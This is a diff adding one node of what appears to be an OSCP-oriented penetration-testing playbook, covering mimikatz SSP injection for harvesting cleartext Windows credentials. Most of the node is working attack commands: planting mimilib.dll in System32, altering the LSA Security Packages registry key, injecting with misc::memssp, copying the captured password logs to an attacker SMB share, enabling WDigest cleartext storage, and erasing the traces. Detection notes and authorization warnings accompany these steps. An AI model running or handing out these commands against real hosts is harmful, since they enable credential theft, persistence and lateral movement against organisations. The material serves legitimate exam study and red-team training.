@@ -1,0 +1,42 @@
+{
+  "id": "ssp_injection_persistence",
+  "phase": "WINDOWS",
+  "title": "SSP Injection — Mimilib Credential Harvesting via Registry",
+  "body": "Once you have SYSTEM or local admin on a Windows host, you can register `mimilib.dll` (shipped with mimikatz) as a Security Support Provider. LSASS loads SSPs at boot to handle authentication protocols (Kerberos, NTLM, Negotiate). When mimilib is loaded as an SSP, it intercepts every authentication that flows through LSASS and writes cleartext credentials to `C:\\Windows\\System32\\kiwissp.log`.\n\nThis is different from `sekurlsa::logonpasswords`:\n  - logonpasswords reads credentials CURRENTLY in LSASS memory (point-in-time snapshot)\n  - SSP injection captures FUTURE authentications — including domain admins who haven't logged in yet\n\nTwo flavors:\n\n  1. REGISTRY-BASED (persistent across reboots, what the screenshot shows):\n     reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v 'Security Packages' ...\n     Modifies the boot-time SSP list. Survives reboots. Requires SYSTEM. Highly OPSEC-noisy.\n\n  2. RUNTIME-ONLY (mimikatz misc::memssp):\n     misc::memssp inside mimikatz\n     Injects into running LSASS. Does NOT survive reboot. Less audit trail.\n     Often used in exam-day labs since you don't need persistence after the box is rooted.\n\nWhen this is useful on OSCP:\n  - You have local admin on a server but the DA hasn't logged in yet — wait for them\n  - You want to capture creds for service accounts that authenticate periodically\n  - You're proving credential exposure for a report (real engagement)\n  - You compromised a jump host and want to harvest every cred used on it\n\nWhen NOT to use this:\n  - You already have DA — this adds noise for no benefit\n  - On real production hosts without explicit scope — modifies LSA registry, requires reboot, generates very loud events\n  - Anywhere you don't have permission to leave persistent artifacts",
+  "cmd": "# ══════════════════════════════════════════════════\n# PREREQUISITE: SYSTEM-LEVEL ACCESS\n# ══════════════════════════════════════════════════\n# Verify:\nwhoami /priv | findstr SeDebugPrivilege\n# Or:\nwhoami\n# Must show: nt authority\\system (or local admin with token::elevate)\n\n# ══════════════════════════════════════════════════\n# PLACE MIMILIB.DLL CORRECTLY\n# ══════════════════════════════════════════════════\n# mimilib.dll is part of the mimikatz release (x64 and Win32 folders).\n# It MUST be placed in C:\\Windows\\System32\\ because that's where LSASS\n# looks for SSP DLLs. Anywhere else and LSASS fails to load it on boot.\n\n# Copy from your staging dir:\ncopy C:\\tools\\mimikatz\\x64\\mimilib.dll C:\\Windows\\System32\\mimilib.dll\n\n# Verify it landed:\ndir C:\\Windows\\System32\\mimilib.dll\n\n# ══════════════════════════════════════════════════\n# METHOD 1 — REGISTRY (PERSISTENT, NEEDS REBOOT)\n# ══════════════════════════════════════════════════\n# Adds mimilib to the LSA Security Packages list. Takes effect on next reboot.\n# The default Security Packages value is:\n#   kerberos msv1_0 schannel wdigest tspkg pku2u\n# We append 'mimilib' to that list.\n\nreg add 'hklm\\system\\currentcontrolset\\control\\lsa\\' /v 'Security Packages' /d 'kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib' /t REG_MULTI_SZ /f\n\n# Note the \\0 separators — REG_MULTI_SZ uses null-terminated strings.\n# PowerShell version (cleaner):\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name 'Security Packages' \\\n    -PropertyType MultiString \\\n    -Value @('kerberos','msv1_0','schannel','wdigest','tspkg','pku2u','mimilib') \\\n    -Force\n\n# Verify the change:\nreg query 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v 'Security Packages'\n\n# After reboot, every authentication writes cleartext creds to:\n#   C:\\Windows\\System32\\kiwissp.log\n\n# ══════════════════════════════════════════════════\n# METHOD 2 — RUNTIME ONLY (MIMIKATZ MEMSSP, NO REBOOT)\n# ══════════════════════════════════════════════════\n# Faster for labs. Injects into running LSASS. Lost on reboot.\n\n.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # misc::memssp\n# 'Injected =)'  ← if you see this, you're done\n\n# Now wait for users to authenticate (lock/unlock screen, RDP, scheduled tasks).\n# Cleartext credentials log to:\n#   C:\\Windows\\System32\\mimilsa.log\n\n# ══════════════════════════════════════════════════\n# COLLECT THE LOGS\n# ══════════════════════════════════════════════════\n# Method 1 log:\ntype C:\\Windows\\System32\\kiwissp.log\n\n# Method 2 log:\ntype C:\\Windows\\System32\\mimilsa.log\n\n# Example output format:\n# [00000000:0001a2b3] CORP\\stephanie\n#   Username : stephanie\n#   Domain   : CORP\n#   Password : Hotdog#1\n\n# Exfil to Kali:\nimpacket-smbserver share . -smb2support\n# Then on the target:\ncopy C:\\Windows\\System32\\kiwissp.log \\\\$lhost\\share\\\n\n# ══════════════════════════════════════════════════\n# CLEANUP (LEAVE NO TRACE)\n# ══════════════════════════════════════════════════\n# Critical for engagement hygiene. On exam, less critical but good habit.\n\n# Restore original Security Packages list:\nreg add 'hklm\\system\\currentcontrolset\\control\\lsa\\' /v 'Security Packages' /d 'kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u' /t REG_MULTI_SZ /f\n\n# Remove the DLL:\ndel C:\\Windows\\System32\\mimilib.dll\n\n# Remove the log:\ndel C:\\Windows\\System32\\kiwissp.log\ndel C:\\Windows\\System32\\mimilsa.log\n\n# ══════════════════════════════════════════════════\n# DETECTION FOOTPRINT (WHAT BLUE TEAMS SEE)\n# ══════════════════════════════════════════════════\n# Method 1 (registry):\n#   - Event 4657 (registry value modified) on HKLM\\...\\Lsa\n#   - File creation events for mimilib.dll in System32\n#   - LSASS loads unsigned DLL at boot (Sysmon Event 7)\n#   - PsLoadedModuleList anomaly (forensics)\n#\n# Method 2 (memssp):\n#   - LSASS receives unsigned code injection (Sysmon Event 8)\n#   - WinDefender flags mimikatz process if AV is on\n#\n# These are HIGH-noise techniques. On OSCP labs there's no monitoring,\n# so use freely. On real engagements, get written permission for LSA\n# modifications — many SOCs treat this as a P0 incident.\n\n# ══════════════════════════════════════════════════\n# RELATED: WDIGEST CLEAR-TEXT TRICK\n# ══════════════════════════════════════════════════\n# Older but still works on unpatched Server 2012 R2 and below.\n# Forces LSASS to keep cleartext passwords in memory:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n# Then wait for next login + sekurlsa::wdigest\n# See mimikatz_advanced for full details.",
+  "warn": "These techniques modify LSA configuration and write to System32. They are persistent, detectable, and on real engagements you MUST clean up and document. On lab boxes (OSCP, HTB) it's fine. Do NOT use registry-based SSP injection on a real client without explicit written authorization — restoring LSA state incorrectly can break authentication on the box and require Safe Mode recovery.",
+  "choices": [
+    {
+      "label": "Got credentials from kiwissp.log — use them",
+      "next": "creds_found"
+    },
+    {
+      "label": "Got DA credentials — DCSync the whole domain",
+      "next": "dcsync"
+    },
+    {
+      "label": "Got NTLM hash instead — pass-the-hash",
+      "next": "pth"
+    },
+    {
+      "label": "Need other mimikatz techniques",
+      "next": "mimikatz_advanced"
+    },
+    {
+      "label": "Need foundational mimikatz usage",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Need broader Windows post-exploit ideas",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Back to Windows credentials hub",
+      "next": "windows_creds"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
